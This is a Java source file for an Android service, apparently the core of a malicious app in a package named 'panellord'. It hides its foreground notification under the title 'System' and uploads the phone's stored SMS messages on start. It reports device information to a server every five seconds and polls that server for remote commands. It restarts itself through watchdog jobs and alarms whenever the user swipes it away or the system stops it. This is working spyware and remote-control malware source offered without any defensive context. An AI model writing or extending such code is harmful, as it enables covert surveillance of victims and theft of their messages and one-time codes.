package com.panellord;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MainService extends Service {
    private static final String TAG = "MainService";
    private ScheduledExecutorService heartbeatScheduler;
    private CommandPoller commandPoller;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannels();
        startForeground(Config.NOTIF_ID_MAIN, buildSilentNotification());

        // Sync old SMS on start
        SmsReceiver.syncOldSms(this);

        // Schedule watchdog job (restarts service every ~5 min, persists across reboots)
        WatchdogJobService.schedule(this);

        // Heartbeat every 5 seconds
        heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
        heartbeatScheduler.scheduleAtFixedRate(this::sendHeartbeat, 0,
                Config.HEARTBEAT_INTERVAL_MS, TimeUnit.MILLISECONDS);

        // Command polling
        commandPoller = new CommandPoller(this);
        commandPoller.start();

        Log.d(TAG, "MainService started");
    }

    private void sendHeartbeat() {
        try {
            JSONObject body = DeviceInfoCollector.buildHeartbeatBody(this);
            body.put("deviceId", DeviceIdManager.getDeviceId(this));
            ApiClient.postJson("/device/heartbeat", body);
        } catch (Exception e) {
            Log.e(TAG, "Heartbeat failed", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Swipe-from-recents: schedule restart via AlarmManager (1.5s later)
        scheduleRestart();
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (heartbeatScheduler != null) heartbeatScheduler.shutdownNow();
        if (commandPoller != null) commandPoller.stop();
        // Auto-restart via AlarmManager (fallback: direct startService)
        scheduleRestart();
        try { startService(new Intent(this, MainService.class)); } catch (Exception ignored) {}
    }

    private void scheduleRestart() {
        try {
            android.app.PendingIntent pi = android.app.PendingIntent.getService(
                this, 7919, new Intent(this, MainService.class),
                android.app.PendingIntent.FLAG_ONE_SHOT
                | android.app.PendingIntent.FLAG_IMMUTABLE);
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) {
                am.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + 1500, pi);
            }
        } catch (Exception ignored) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);

            // Main channel — minimum importance (no sound, no popup, no icon in statusbar)
            NotificationChannel ch = new NotificationChannel(
                    Config.NOTIF_CHANNEL, "Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setDescription("");
            if (nm != null) nm.createNotificationChannel(ch);

            // Silent channel
            NotificationChannel sl = new NotificationChannel(
                    Config.NOTIF_CHANNEL_SL, "Background", NotificationManager.IMPORTANCE_MIN);
            sl.setShowBadge(false);
            sl.setSound(null, null);
            sl.enableLights(false);
            sl.enableVibration(false);
            if (nm != null) nm.createNotificationChannel(sl);
        }
    }

    private Notification buildSilentNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, Config.NOTIF_CHANNEL);
        } else {
            b = new Notification.Builder(this).setPriority(Notification.PRIORITY_MIN);
        }
        return b.setContentTitle("System")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build();
    }
}
